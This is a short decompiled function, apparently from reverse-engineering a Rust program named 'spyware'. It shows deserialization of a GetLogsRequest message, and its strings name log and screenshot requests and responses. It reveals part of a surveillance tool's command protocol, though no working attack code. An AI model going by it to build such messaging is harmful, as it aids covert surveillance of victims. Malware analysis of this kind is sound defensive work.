long long spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::GetLogsRequest>::deserialize(unsigned long long a0, unsigned long long a1)
{
    a0.deserialize_struct(a1, "GetLogsRequestGetLogsResponseGetScreenshotRequestDisplayScreenshotbufferwidthheightGetScreenshotResponsedisplays_screenshotsMessage", 14);
    return a0;
}
